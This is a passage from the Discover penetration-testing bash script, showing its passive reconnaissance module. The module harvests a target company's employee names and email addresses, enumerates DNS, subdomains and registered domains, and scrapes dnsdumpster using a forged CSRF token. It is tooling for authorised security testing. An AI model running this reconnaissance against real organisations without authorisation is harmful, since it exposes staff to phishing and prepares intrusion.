#!/bin/bash
#
# by Lee Baird
# Contact me via chat or email with any feedback or suggestions that you may have:
# leebaird@gmail.com
#
# Special thanks to the following people:
#
# Jay Townsend - conversion from Backtrack to Kali, manages pull requests & issues
# Jason Ashton (@ninewires)- Penetration Testers Framework (PTF) compatibility, Registered Domains, bug crusher, and bash ninja
#
# Ben Wood (@DilithiumCore) - regex master
# Dave Klug - planning, testing and bug reports
# Jason Arnold (@jasonarnold) - planning original concept, author of ssl-check and co-author of crack-wifi
# John Kim - python guru, bug smasher, and parsers
# Eric Milam (@Brav0Hax) - total re-write using functions
# Hector Portillo - report framework v3
# Ian Norden (@iancnorden) - report framework v2
# Martin Bos (@cantcomputer) - IDS evasion techniques
# Matt Banick - original development
# Numerous people on freenode IRC - #bash and #sed (e36freak)
# Rob Dixon (@304geek) - report framework concept
# Robert Clowser (@dyslexicjedi)- all things
# Saviour Emmanuel - Nmap parser
# Securicon, LLC. - for sponsoring development of parsers
# Steve Copland - report framework v1

##############################################################################################################

# Catch process termination
trap f_terminate SIGHUP SIGINT SIGTERM

# Global variables
home=$HOME
long='========================================================================================================================================================'
medium='=================================================================='
short='========================================'
sip='sort -n -u -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4'

# Check for instances of Discover >1
updatedb
locate discover.sh > tmpinstance
instqty=$(wc -l tmpinstance | cut -d ' ' -f1)

if [ $instqty -gt 1 ]; then
     echo
     echo -e "\x1B[1;33m$medium \x1B[0m"
     echo
     echo -e "Found \x1B[1;33m$instqty\x1B[0m instances of Discover on your system."
     echo 'Refer to the following paths:'
     cat tmpinstance | sed 's/^/\t/'
     echo
     echo 'Remove or rename all but the install path and try again.'
     echo -e "If renaming, \x1B[1;33m'discover.sh'\x1B[0m can't be in name. Try \x1B[1;33m'discover.bu'\x1B[0m etc."
     echo
     echo -e "\x1B[1;33m$medium \x1B[0m"
     echo
     rm tmpinstance
     exit 1
else
     rm tmpinstance
fi

# Check for OS X
if [[ `uname` == 'Darwin' ]]; then
     browser=Safari
     discover=$(locate discover.sh | sed 's:/[^/]*$::')
     interface=en0
     ip=$(ifconfig | grep 'en0' -A2 | grep 'inet' | cut -d ' ' -f2)
     msf=/opt/metasploit-framework/bin/msfconsole
     msfv=/opt/metasploit-framework/bin/msfvenom
     port=4444
     web="open -a Safari"
else
     browser=Firefox
     discover=$(updatedb; locate discover.sh | sed 's:/[^/]*$::')
     interface=$(ip addr | grep 'global' | awk '{print $8}')
     ip=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}')
     msf=msfconsole
     msfv=msfvenom
     port=443
     web="firefox -new-tab"
fi

##############################################################################################################

f_banner(){
echo
echo -e "\x1B[1;33m
 _____  ___  _____  _____  _____  _    _  _____  _____
|     \  |  |____  |      |     |  \  /  |____  |____/
|_____/ _|_ _____| |_____ |_____|   \/   |_____ |    \_

By Lee Baird\x1B[0m"
echo
echo
}

##############################################################################################################

f_error(){
echo
echo -e "\x1B[1;31m$medium\x1B[0m"
echo
echo -e "\x1B[1;31m                *** Invalid choice or entry. ***\x1B[0m"
echo
echo -e "\x1B[1;31m$medium\x1B[0m"
sleep 2
f_main
}

f_errorOSX(){
if [[ `uname` == 'Darwin' ]]; then
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     echo
     echo -e "\x1B[1;31m            *** Not OS X compatible. ***\x1B[0m"
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     sleep 2
     f_main
fi
}

##############################################################################################################

f_location(){
echo
echo -n "Enter the location of your file: "
read -e location

# Check for no answer
if [[ -z $location ]]; then
     f_error
fi

# Check for wrong answer
if [ ! -f $location ]; then
     f_error
fi
}

##############################################################################################################

f_runlocally(){
if [[ -z $DISPLAY ]]; then
     clear
     f_banner
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     echo
     echo -e "\x1B[1;31m *** This option must be run locally, in an X-Windows environment. ***\x1B[0m"
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     sleep 4
     f_main
fi
}

##############################################################################################################

f_terminate(){

save_dir=$home/data/cancelled-`date +%H:%M:%S`
echo
echo "Terminating..."
echo
echo -e "\e[1;33mAll data will be saved in $save_dir.\e[0m"


mkdir $save_dir

# Nmap and Metasploit scans
mv $name/ $save_dir 2>/dev/null

# Recon files
mv curl debug* dns emails* domain hosts names* network* passive* registered* squatting sub* tmp* whois* z* doc pdf ppt txt xls $save_dir 2>/dev/null
cd /tmp/
rm emails names networks profiles subdomains 2>/dev/null

echo
echo "Saving complete."
echo
echo

exit
}

##############################################################################################################

f_domain(){
clear
f_banner
echo -e "\x1B[1;34mRECON\x1B[0m"
echo
echo "1.  Passive"
echo "2.  Active"
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     clear
     f_banner

     echo -e "\x1B[1;34mUses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester,\x1B[0m"
     echo -e "\x1B[1;34m Metasploit, URLCrazy, Whois, multiple websites, and recon-ng.\x1B[0m"
     echo
     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub,\x1B[0m"
     echo -e "\x1B[1;34m Google, Hashes, and Shodan for maximum results with recon-ng.\x1B[0m"
     echo
     echo $medium
     echo
     echo "Usage"
     echo
     echo "Company: Target"
     echo "Domain:  target.com"
     echo
     echo $medium
     echo
     echo -n "Company: "
     read company

     # Check for no answer
     if [[ -z $company ]]; then
          f_error
     fi

     echo -n "Domain:  "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     rundate=`date +%B' '%d,' '%Y`

     # If folder doesn't exist, create it
     if [ ! -d $home/data/$domain ]; then
          cp -R $discover/report/ $home/data/$domain
          sed -i "s/#COMPANY#/$company/" $home/data/$domain/index.htm
          sed -i "s/#DOMAIN#/$domain/" $home/data/$domain/index.htm
          sed -i "s/#DATE#/$rundate/" $home/data/$domain/index.htm
     fi

     echo
     echo -n "Do you have a list of names from salesforce to import? (y/N) "
     read answer

     if [ "$answer" == "y" ]; then
          f_location
          echo "last_name#first_name#title" > $home/data/names.csv
          cat $location | sed 's/, /#/' | sed 's/  /#/' | tr -s ' ' | tr -d '\t' | sed 's/;/#/g; s/#$//g' >> $home/data/names.csv
          cat $discover/resource/recon-ng-import-names.rc > passive2.rc
     fi

     # Number of tests
     total=31

     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )

     echo
     echo $medium
     echo
     echo "ARIN"
     echo "     Email                (1/$total)"
     wget -q https://whois.arin.net/rest/pocs\;domain=$domain -O tmp.xml

     if [ -s tmp.xml ]; then
          xmllint --format tmp.xml | grep 'handle' | cut -d '>' -f2 | cut -d '<' -f1 | sort -u > zurls.txt
          xmllint --format tmp.xml | grep 'handle' | cut -d '"' -f2 | sort -u > zhandles.txt

          while read x; do
               wget -q $x -O tmp2.xml
               xml_grep 'email' tmp2.xml --text_only >> tmp
          done < zurls.txt

          cat tmp | sort -u > zarin-emails
     fi

     rm tmp*

     echo "     Names                (2/$total)"
     if [ -e zhandles.txt ]; then
          while read y; do
               curl --silent https://whois.arin.net/rest/poc/$y.txt | grep 'Name' >> tmp
          done < zhandles.txt

          egrep -v '(@|Network|Telecom)' tmp | sed 's/Name:           //g' | tr '[A-Z]' '[a-z]' | sed 's/\b\(.\)/\u\1/g' > tmp2
          awk -F", " '{print $2,$1}' tmp2 | sed 's/  / /g' | sort -u > zarin-names
     fi

     rm zurls.txt zhandles.txt 2>/dev/null

     echo "     Networks             (3/$total)"
     wget -q https://whois.arin.net/rest/orgs\;name=$companyurl -O tmp.xml

     if [ -s tmp.xml ]; then
          xmllint --format tmp.xml | grep 'handle' | cut -d '/' -f6 | cut -d '<' -f1 | sort -uV > tmp

          while read handle; do
               echo "          " $handle
               curl --silent https://whois.arin.net/rest/org/$handle/nets.txt | head -1 > tmp2
               if grep 'DOCTYPE' tmp2 > /dev/null; then
                    echo > /dev/null
               else
                    awk '{print $4 "-" $6}' tmp2 >> tmp3
               fi
          done < tmp
     fi

     $sip tmp3 > networks-tmp 2>/dev/null
     rm tmp* 2>/dev/null
     echo

     echo "dnsrecon                  (4/$total)"
     dnsrecon -d $domain > tmp
     grep '*' tmp | egrep -v '(Bind Version|Checking|DNSSEC|Enumerating|No SRV Records|Performing|Removing|Resolving|Servers found|Trying)' | sed 's/\[\*\]//g' | sed 's/^[ \t]*//' | column -t | sort -k1 >> $home/data/$domain/data/records.htm
     grep $domain tmp | awk '{print $3 " " $4}' | awk '$2 !~ /[a-z]/' | column -t > sub1
     rm tmp 2>/dev/null
     echo

     echo "goofile                   (5/$total)"
     $discover/mods/goofile.py -d $domain -f doc > tmp
     $discover/mods/goofile.py -d $domain -f docx >> tmp
     $discover/mods/goofile.py -d $domain -f pdf >> tmp
     $discover/mods/goofile.py -d $domain -f ppt >> tmp
     $discover/mods/goofile.py -d $domain -f pptx >> tmp
     $discover/mods/goofile.py -d $domain -f txt >> tmp
     $discover/mods/goofile.py -d $domain -f xls >> tmp
     $discover/mods/goofile.py -d $domain -f xlsx >> tmp

     grep $domain tmp | grep -v 'Searching in' | grep -Fv '...' | sort -u > tmp2

     grep '.doc' tmp2 | egrep -v '(.pdf|.ppt|.xls)' > doc
     grep '.pdf' tmp2 > pdf
     grep '.ppt' tmp2 > ppt
     grep '.txt' tmp2 | grep -v 'robots.txt' > txt
     grep '.xls' tmp2 > xls
     rm tmp* 2>/dev/null
     # Remove all empty files
     find -type f -empty -exec rm {} +
     echo

     echo "goog-mail                 (6/$total)"
     $discover/mods/goog-mail.py $domain > zgoog-mail
     # Remove all empty files
     find -type f -empty -exec rm {} +
     echo

     echo "goohost"
     echo "     IP                   (7/$total)"
     $discover/mods/goohost.sh -t $domain -m ip >/dev/null
     echo "     Email                (8/$total)"
     $discover/mods/goohost.sh -t $domain -m mail >/dev/null
     cat report-* > tmp
     # Move the second column to the first position
     grep $domain tmp | awk '{print $2 " " $1}' > tmp2
     column -t tmp2 > zgoohost
     rm *-$domain.txt
     rm tmp* 2>/dev/null
     echo

     echo "theHarvester"
     # PTF
     if [ -f /pentest/intelligence-gathering/theharvester/theHarvester.py ]; then
          theharvester="theHarvester"
     else
          theharvester="/usr/share/theharvester/theHarvester.py"
     fi

     echo "     Baidu                (9/$total)"
     #$theharvester -d $domain -b baidu | grep $domain > zbaidu
     echo "     Bing                 (10/$total)"
     $theharvester -d $domain -b bing | grep $domain | sed 's/:/ /g' | tr '[A-Z]' '[a-z]' | column -t | sort -u > zbing
     echo "     Dogpilesearch        (11/$total)"
     $theharvester -d $domain -b dogpilesearch | grep $domain > zdogpilesearch
     echo "     Google               (12/$total)"
     $theharvester -d $domain -b google | grep $domain | sed 's/:/ /g' | tr '[A-Z]' '[a-z]' | column -t | sort -u > zgoogle
     echo "     Google CSE           (13/$total)"
     $theharvester -d $domain -b googleCSE | sed -n '/---/,$p' | egrep -v '(-|found)' | sed '/^$/d' > zgoogleCSE
     echo "     Google+              (14/$total)"
     $theharvester -d $domain -b googleplus | sed -n '/===/,$p' | grep -v '=' | sed 's/- Google+//g' | sort -u > zgoogleplus
     echo "     Google Profiles	  (15/$total)"
     $theharvester -d $domain -b google-profiles | sed -n '/---/,$p' | grep -v '-' | sort -u > zgoogle-profiles
     echo "     Jigsaw               (16/$total)"
     $theharvester -d $domain -b jigsaw | sed -n '/===/,$p' | grep -v '=' > zjigsaw
     echo "     LinkedIn             (17/$total)"
     $theharvester -d "$company" -b linkedin | sed -n '/===/,$p' | grep -v '=' | sed 's/[^ ]\+/\L\u&/g' | sed 's/ - .*$//g' | sort -u > zlinkedin
     $theharvester -d $domain -b linkedin | sed -n '/===/,$p' | grep -v '=' | sed 's/[^ ]\+/\L\u&/g' | sort -u > zlinkedin2
     echo "     PGP                  (18/$total)"
     $theharvester -d $domain -b pgp | grep $domain | tr '[A-Z]' '[a-z]' | sort -u > zpgp
     echo "     Yahoo                (19/$total)"
     $theharvester -d $domain -b yahoo  | grep $domain | sed 's/:/ /g' | tr '[A-Z]' '[a-z]' | column -t | sort -u > zyahoo
     echo "     All                  (20/$total)"
     $theharvester -d $domain -b all  | grep $domain | sed 's/:/ /g' | tr '[A-Z]' '[a-z]' | column -t | sort -u > zall

     rm debug*
     # Remove all empty files
     find -type f -empty -exec rm {} +
     echo

     echo "Metasploit                (21/$total)"
     msfconsole -x "use auxiliary/gather/search_email_collector; set DOMAIN $domain; run; exit y" > tmp 2>/dev/null
     grep @$domain tmp | awk '{print $2}' | grep -v '%' | grep -Fv '...@' > zmsf
     rm tmp 2>/dev/null
     echo

     echo "URLCrazy                  (22/$total)"
     urlcrazy $domain > tmp
     sed -n '/Character/,$p' tmp | sed 's/AUSTRALIA/Australia/g; s/AUSTRIA/Austria/g; s/BAHAMAS/Bahamas/g; s/BANGLADESH/Bangladesh/g; s/BELGIUM/Belgium/g; s/BULGARIA/Bulgaria/g; s/CANADA/Canada/g; s/CAYMAN ISLANDS/Cayman Islands/g; s/CHILE/Chile/g; s/CHINA/China/g; s/COLOMBIA/Columbia/g; s/COSTA RICA/Costa Rica/g; s/CZECH REPUBLIC/Czech Republic/g; s/DENMARK/Denmark/g; s/DOMINICAN REPUBLIC/Dominican Republic/g; s/EUROPEAN UNION/European Union/g; s/FINLAND/Finland/g; s/FRANCE/France/g; s/GERMANY/Germany/g; s/HONG KONG/Hong Kong/g; s/HUNGARY/Hungary/g; s/INDIA/India/g; s/INDONESIA/Indonesia/g; s/IRELAND/Ireland/g; s/ISRAEL/Israel/g; s/ITALY/Italy/g; s/JAPAN/Japan/g; s/KOREA REPUBLIC OF/Republic of Korea/g; s/LUXEMBOURG/Luxembourg/g; s/NETHERLANDS/Netherlands/g; s/NORWAY/Norway/g; s/POLAND/Poland/g; s/PUERTO RICO/Puerto Rico/g; s/RUSSIAN FEDERATION/Russia            /g; s/SAUDI ARABIA/Saudi Arabia/g; s/SINGAPORE/Singapore/g; s/SPAIN/Spain/g; s/SWEDEN/Sweden/g; s/SWITZERLAND/Switzerland/g; s/TAIWAN REPUBLIC OF China (ROC)/Taiwan                        /g; s/THAILAND/Thailand/g; s/TURKEY/Turkey/g; s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United States/g; s/VIRGIN ISLANDS (BRITISH)/Virgin Islands          /g; s/ROMANIA/Romania/g; s/SLOVAKIA/Slovakia/g; s/?/ /g' > tmp2
     # Remove the last column
     cat tmp2 | rev | sed 's/^[ \t]*//' | cut -d ' ' -f2- | rev > tmp3
     # Find lines that contain an IP
     grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" tmp3 > squatting
     rm tmp*

     ##############################################################

     echo
     echo "Whois"
     echo "     Domain               (23/$total)"
     whois -H $domain > tmp 2>/dev/null
     # Remove leading whitespace
     sed 's/^[ \t]*//' tmp > tmp2
     # Clean up
     egrep -v '(#|%|<a|=-=-=-=|;|Access may be|Additionally|Afilias except|and DNS Hosting|and limitations of|any use of|Be sure to|at the end of|By submitting an|by the terms|can easily change|circumstances will|clientDeleteProhibited|clientTransferProhibited|clientUpdateProhibited|company may be|complaint will|contact information|Contact us|Copy and paste|currently set|database|data contained in|data presented in|date of|details go to|dissemination|Domaininfo AB|Domain Management|Domain names in|Domain status: ok|enable high|except as reasonably|failure to|facsimile of|for commercial purpose|for detailed information|For information for|for information purposes|For more information|for the sole|Get Noticed|Get a FREE|guarantee its|HREF|In Europe|In most cases|in obtaining|in the address|includes restrictions|including spam|information is provided|is not the|is providing|JPRS database provides|Learn how|Learn more|makes this information|MarkMonitor|mining this data|minute and one|modify existing|modify these terms|must be sent|name cannot|NamesBeyond|not to use|Note: This|NOTICE|obtaining information about|of Moniker|of this data|or hiding any|or otherwise support|other use of|own existing customers|Please be advised|Please note|policy|prior written consent|privacy is|Problem Reporting System|Professional and|prohibited without|Promote your|protect the|Public Interest|queries or|Register your|Registrars|registration record|repackaging,|responsible for|See Business Registration|server at|solicitations via|sponsorship|Status|support questions|support the transmission|telephone, or facsimile|that apply to|that you will|the right| The data is|The fact that|the transmission|The Trusted Partner|This listing is|This feature is|This information|This service is|to collect or|to entities|to report any|To suppress Japanese|transmission of mass|UNITED STATES|United States|unsolicited advertising|Users may|Version 6|via e-mail|Visit AboutUs.org|while believed|will use this|with many different|with no guarantee|We reserve the|Whois|whois_guidanceyou agree|You may not)' tmp2 > tmp3
     # Remove lines starting with "*"
     sed '/^*/d' tmp3 > tmp4
     # Remove lines starting with "-"
     sed '/^-/d' tmp4 > tmp5
     # Remove lines starting with http
     sed '/^http/d' tmp5 > tmp6
     # Remove lines starting with US
     sed '/^US/d' tmp6 > tmp7
     # Clean up phone numbers
     sed 's/+1.//g' tmp7 > tmp8
     # Remove leading whitespace from file
     awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp8 > tmp9
     # Remove trailing whitespace from each line
     sed 's/[ \t]*$//' tmp9 > tmp10
     # Compress blank lines
     cat -s tmp10 > tmp11
     # Remove lines that end with various words then a colon or period(s)
     egrep -v '(2:$|3:$|Address.$|Address........$|Address.........$|Ext.:$|FAX:$|Fax............$|Fax.............$|Province:$|Server:$)' tmp11 > tmp12
     # Remove line after "Domain Servers:"
     sed -i '/^Domain Servers:/{n; /.*/d}' tmp12
     # Remove line after "Domain servers"
     sed -i '/^Domain servers/{n; /.*/d}' tmp12
     # Remove blank lines from end of file
     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp12 > tmp13
     # Format output
     sed 's/: /:#####/g' tmp13 | column -s '#' -t -n > whois-domain
     rm tmp*

     echo "     IP 		  (24/$total)"
     curl --silent https://www.ultratools.com/tools/ipWhoisLookupResult?ipAddress=$domain > ultratools
     y=$(sed -e 's/^[ \t]*//' ultratools | grep -A1 '>IP Address' | grep -v 'IP Address' | grep -o -P '(?<=>).*(?=<)')

     if ! [ "$y" = "" ]; then
          whois -H $y > tmp
          # Remove leading whitespace
          sed 's/^[ \t]*//' tmp > tmp2
          # Remove trailing whitespace from each line
          sed 's/[ \t]*$//' tmp2 > tmp3
          # Clean up
          egrep -v '(\#|\%|\*|All reports|Comment|dynamic hosting|For fastest|For more|Found a referral|http|OriginAS:$|Parent:$|point in|RegDate:$|remarks:|The activity|the correct|this kind of object|Without these)' tmp3 > tmp4
          # Remove leading whitespace from file
          awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp4 > tmp5
          # Remove blank lines from end of file
          awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
          # Compress blank lines
          cat -s tmp6 > tmp7
          # Clean up
          sed 's/+1-//g' tmp7 > tmp8
          # Change multiple spaces to single
          sed 's/ \+ / /g' tmp8 > tmp9
          # Format output
          sed 's/: /:#####/g' tmp9 | column -s '#' -t -n > whois-ip
          rm tmp*
     else
          echo > whois-ip
     fi

     rm ultratools

     echo
     echo "dnsdumpster.com           (25/$total)"
     wget -q https://dnsdumpster.com/static/map/$domain.png -O $home/data/$domain/assets/images/dnsdumpster.png

     # Generate a random cookie value
     rando=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

     curl --silent --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$rando&targetip=$domain" --cookie "csrftoken=$rando; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com > tmp

     dumpsterxls=$(grep 'xls' tmp | tr '"' ' ' | cut -d ' ' -f10)

     wget -q $dumpsterxls -O tmp.xlsx
     ssconvert -E Gnumeric_Excel:xlsx -T Gnumeric_stf:stf_csv tmp.xlsx tmp.csv 2>/dev/null
     cat tmp.csv | sed 's/,"//g' | egrep -v '(Hostname|MX|NS)' | cut -d ',' -f1-2 | grep -v '"' | sed 's/,/ /g' | sort -u | column -t > sub-dnsdumpster
     rm tmp*

     echo
     echo "email-format.com          (26/$total)"
     curl --silent https://www.email-format.com/d/$domain/ > tmp
     grep -o [A-Za-z0-9_.]*@[A-Za-z0-9_.]*[.][A-Za-z]* tmp | tr '[A-Z]' '[a-z]' | sort -u > zemail-format
     rm tmp

     echo
     echo "intodns.com               (27/$total)"
     wget -q http://www.intodns.com/$domain -O tmp
     cat tmp | sed '1,32d' | sed 's/<table width="99%" cellspacing="1" class="tabular">/<center><table width="85%" cellspacing="1" class="tabular"><\/center>/g' | sed 's/Test name/Test/g' | sed 's/ <a href="feedback\/?KeepThis=true&amp;TB_iframe=true&amp;height=300&amp;width=240" title="intoDNS feedback" class="thickbox feedback">send feedback<\/a>//g' | sed 's/ background-color: #ffffff;//' | sed 's/<center><table width="85%" cellspacing="1" class="tabular"><\/center>/<table class="table table-bordered">/' | sed 's/<td class="icon">/<td class="inc-table-cell-status">/g' | sed 's/<tr class="info">/<tr>/g' | egrep -v '(Processed in|UA-2900375-1|urchinTracker|script|Work in progress)' | sed '/footer/I,+3 d' | sed '/google-analytics/I,+5 d' > tmp2
     cat tmp2 >> $home/data/$domain/pages/config.htm

     # Add new icons
     sed -i 's|/static/images/error.gif|\.\./assets/images/icons/fail.png|g' $home/data/$domain/pages/config.htm
     sed -i 's|/static/images/fail.gif|\.\./assets/images/icons/fail.png|g' $home/data/$domain/pages/config.htm
     sed -i 's|/static/images/info.gif|\.\./assets/images/icons/info.png|g' $home/data/$domain/pages/config.htm
     sed -i 's|/static/images/pass.gif|\.\./assets/images/icons/pass.png|g' $home/data/$domain/pages/config.htm
     sed -i 's|/static/images/warn.gif|\.\./assets/images/icons/warn.png|g' $home/data/$domain/pages/config.htm
     sed -i 's|\.\.\.\.|\.\.|g' $home/data/$domain/pages/config.htm
     # Insert missing table tag
     sed -i 's/.*<thead>.*/     <table border="4">\n&/' $home/data/$domain/pages/config.htm
     # Add blank lines below table
     sed -i 's/.*<\/table>.*/&\n<br>\n<br>/' $home/data/$domain/pages/config.htm
     # Remove unnecessary JS at bottom of page
     sed -i '/Math\.random/I,+6 d' $home/data/$domain/pages/config.htm
     rm tmp*

     echo
     echo "netcraft.com              (28/$total) bad"
     echo "     Actively working on alternative"
     # wget -q https://toolbar.netcraft.com/site_report?url=http://www.$domain -O tmp

     # # Remove lines from FOO to the second BAR
     # awk '/DOCTYPE/{f=1} (!f || f>2){print} (f && /\/form/){f++}' tmp > tmp2
     # egrep -v '(Background|Hosting country|the-world-factbook)' tmp2 | sed 's/Refresh//g' > tmp3

     # # Find lines that contain FOO, and delete to the end of file
     # sed '/security_table/,${D}' tmp3 | sed 's/<h2>/<h4>/g' | sed 's/<\/h2>/<\/h4>/g' > tmp4

     # # Compress blank lines
     # sed /^$/d tmp4 >> $home/data/$domain/pages/netcraft.htm
     # echo >> $home/data/$domain/pages/netcraft.htm
     # echo '</body>' >> $home/data/$domain/pages/netcraft.htm
     # echo '</html>' >> $home/data/$domain/pages/netcraft.htm

     echo
     echo "ultratools.com            (29/$total)"
     x=0

     f_passive_axfr(){
          sed -e 's/<[^>]*>//g' curl > tmp
          grep -A4 "\<.*$domain\>" tmp | sed 's/--//g' | sed 's/\.$//g' | sed 's/^ *//g' | sed '/^$/d' > tmp2
          cat tmp2 | paste - - - - - -d, | column -s ',' -t > tmp3
          sort -u tmp3 >> $home/data/$domain/data/zonetransfer.htm
          echo >> $home/data/$domain/data/zonetransfer.htm
     }

     while [ $x -le 10 ]; do
          curl -k --silent https://www.ultratools.com/tools/zoneFileDumpResult?zoneName=$domain > curl
          q=$(grep "$domain" curl | wc -l)

          if [ $q -gt 1 ]; then
               f_passive_axfr
               break
          else
               x=$(( $x + 1 ))
               sleep 2
          fi
     done

     if [ $x -eq 11 ]; then
          echo 'Zone transfer failed.' >> $home/data/$domain/data/zonetransfer.htm
          echo '</pre>' >> $home/data/$domain/data/zonetransfer.htm
     fi

     rm curl

     echo
     echo "Registered Domains        (30/$total)"
     f_regdomain(){
     while read regdomain; do
          whois -H $regdomain 2>&1 | sed -e 's/^[ \t]*//' | sed 's/ \+ //g' | sed 's/: /:/g' > tmp5
          nomatch=$(grep -c -E 'No match for|Name or service not known' tmp5)

          if [[ $nomatch -eq 1 ]]; then
               echo "$regdomain -- No Whois Matches Found" >> tmp4
          else
               registrar=$(grep -m1 'Registrar:' tmp5 | cut -d ':' -f2 | sed 's/,//g')
               regorg=$(grep -m1 'Registrant Organization:' tmp5 | cut -d ':' -f2 | sed 's/,//g')
               regemail=$(grep -m1 'Registrant Email:' tmp5 | cut -d ':' -f2 | tr 'A-Z' 'a-z')
               iptmp=$(ping -c1 $regdomain 2>&1)

               if echo $iptmp | grep -q 'unknown host'; then
                    echo "$regdomain,No IP Found,$regemail,$regorg,$registrar" >> tmp4
               else
                    ipaddr=$(echo $iptmp | grep 'PING' | cut -d '(' -f2 | cut -d ')' -f1)
                    echo "$regdomain,$ipaddr,$regemail,$regorg,$registrar" >> tmp4
               fi
          fi

          let number=number+1
          echo -ne "     \x1B[1;33m$number \x1B[0mof \x1B[1;33m$domcount \x1B[0mdomains"\\r
          sleep 2
     done < tmp3
     }

     # Get domains registered by company name and email address domain
     curl --silent http://viewdns.info/reversewhois/?q=%40$domain > tmp
     sleep 2
     curl --silent http://viewdns.info/reversewhois/?q=$companyurl > tmp2

     echo '111AAA--placeholder--' > tmp4

     if grep -q 'There are 0 domains' tmp && grep -q 'There are 0 domains' tmp2; then
          rm tmp tmp2
          echo 'No Domains Found.' > tmp6
     elif ! [ -s tmp ] && ! [ -s tmp2 ]; then
          rm tmp tmp2
          echo 'No Domains Found.' > tmp6

     # Loop thru list of domains, gathering details about the domain
     elif grep -q 'paymenthash' tmp; then
          grep 'Domain Name' tmp | sed 's/<tr>/\n/g' | grep '</td></tr>' | cut -d '>' -f2 | cut -d '<' -f1 > tmp3
          grep 'Domain Name' tmp2 | sed 's/<tr>/\n/g' | grep '</td></tr>' | cut -d '>' -f2 | cut -d '<' -f1 >> tmp3
          sort -uV tmp3 -o tmp3
          domcount=$(wc -l tmp3 | sed -e 's/^[ \t]*//' | cut -d ' ' -f1)
          f_regdomain
     else
          grep 'ViewDNS.info' tmp | sed 's/<tr>/\n/g' | grep '</td></tr>' | grep -v -E 'font size|Domain Name' | cut -d '>' -f2 | cut -d '<' -f1 > tmp3
          grep 'ViewDNS.info' tmp2 | sed 's/<tr>/\n/g' | grep '</td></tr>' | grep -v -E 'font size|Domain Name' | cut -d '>' -f2 | cut -d '<' -f1 >> tmp3
          sort -uV tmp3 -o tmp3
          domcount=$(wc -l tmp3 | sed -e 's/^[ \t]*//' | cut -d ' ' -f1)
          f_regdomain
     fi

     # Formatting & clean-up
     sort tmp4 | sed 's/111AAA--placeholder--/Domain,IP Address,Registration Email,Registration Org,Registrar,/' | grep -v 'Matches Found' > tmp6
     grep '@' tmp6 | column -n -s ',' -t > registered-domains
     echo "Domains registered to $company using a corporate email." >> $home/data/$domain/data/registered-domains.htm
     echo >> $home/data/$domain/data/registered-domains.htm
     echo

     ##############################################################

     cat z* | grep '@' | sort -u > emails

     cat z* | sed '/^[0-9]/!d' | column -t | awk '{print $2 " " $1}' | column -t | sort -k1 -u > sub2

     # Remove lines that contain a number or  @
     cat z* | sed '/[0-9]/d' | grep -v '@' | sort -u > tmp

     if [ -e tmp ]; then
          # Remove lines that start with .
          sed '/^\./ d' tmp > tmp2
          # Change to lower case
          cat tmp2 | tr '[A-Z]' '[a-z]' > tmp3
          # Clean up
          egrep -v '(~|`|!|@|#|\$|%|\^|&|\*|\(|\)|_|-|\+|=|{|\[|}|]|\|:|;|"|<|>|\.|\?|/|abuse|academy|account|achievement|acquisition|acting|action|active|adjuster|admin|advanced|adventure|advertising|agency|alliance|allstate|ambassador|america|american|analysis|analyst|analytics|animal|another|antivirus|apple seems|application|applications|architect|archivist|article|assembler|assembling|assembly|asian|assignment|assistant|associate|association|attorney|audience|audio|auditor|australia|authority|automation|automotive|aviation|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|builder|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|centre|certified|cfi|challenger|championship|change|chapter|charge|chemistry|china|chinese|claim|class|clearance|cloud|cnc|code|cognitive|college|columbia|coming|commercial|communications|community|company pages|competition|competitive|compliance|computer|comsec|concept|conference|config|connections|connect|construction|consultant|contact|contract|contributor|control|cooperation|coordinator|corporate|corporation|counsel|create|creative|critical|crm|croatia|cryptologic|custodian|cyber|dallas|database|day care|dba|dc|death toll|delivery|delta|department|deputy|description|designer|design|destructive|detection|develop|devine|dialysis|digital|diploma|direct|disability|disaster|disclosure|dispatch|dispute|distribut|divinity|division|dns|document|dos poc|download|driver|during|economy|ecovillage|editor|education|effect|electronic|else|email|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expectations|expertzone|exploit|expressplay|facebook|facilit|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|fellow|filmmaker|finance|financial|fitter|forensic|forklift|found|freelance|from|frontiers in tax|fulfillment|full|function|future|fuzzing|germany|get control|global|gnoc|google|governance|government|graphic|greater|group|guard|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|hostmaster|house|how to|hurricane|icmp|idc|in the 